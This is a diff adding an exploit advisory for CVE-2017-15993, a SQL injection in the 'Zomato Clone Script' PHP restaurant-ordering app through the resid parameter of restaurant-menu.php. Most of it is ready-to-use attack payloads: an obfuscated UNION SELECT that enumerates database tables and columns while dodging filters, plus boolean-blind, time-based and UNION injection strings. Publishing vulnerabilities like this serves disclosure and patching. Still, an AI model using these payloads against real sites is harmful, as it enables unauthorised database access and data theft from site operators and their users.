@@ -1,0 +1,40 @@
+# # # # # 
+# Exploit Title: Zomato Clone Script - SQL Injection
+# Dork: N/A
+# Date: 30.10.2017
+# Vendor Homepage: http://www.phpscriptsmall.com/
+# Software Link: http://www.exclusivescript.com/product/099S4111872/php-scripts/zomato-clone-script
+# Demo: http://jhinstitute.com/demo/foodpanda/
+# Version: N/A
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2017-15993
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# http://localhost/[PATH]/restaurant-menu.php?resid=[SQL]
+# 
+# -539'+++/*!02222UNION*/+/*!02222SELECT*/+0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,0x3130,(/*!02222Select*/+export_set(5,@:=0,(/*!02222select*/+count(*)/*!02222from*/(information_schema.columns)where@:=export_set(5,export_set(5,@,/*!02222table_name*/,0x3c6c693e,2),/*!02222column_name*/,0xa3a,2)),@,2)),0x3132,0x3133,0x3134--+-
+# 
+# Parameter: resid (GET)
+#     Type: boolean-based blind
+#     Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+#     Payload: resid=-9239 OR 3532=3532#
+# 
+#     Type: AND/OR time-based blind
+#     Title: MySQL >= 5.0.12 AND time-based blind
+#     Payload: resid=539 AND SLEEP(5)
+# 
+#     Type: UNION query
+#     Title: MySQL UNION query (87) - 10 columns
+#     Payload: resid=539 UNION ALL SELECT 87,87,87,87,87,CONCAT(0x7170767071,0x7368446c664e5950484e757a6b4b5a616972446f41484d74485874656e476369647a774865767369,0x7176766b71),87,87,87,87#
+# 
+# Etc..
+# # # # #
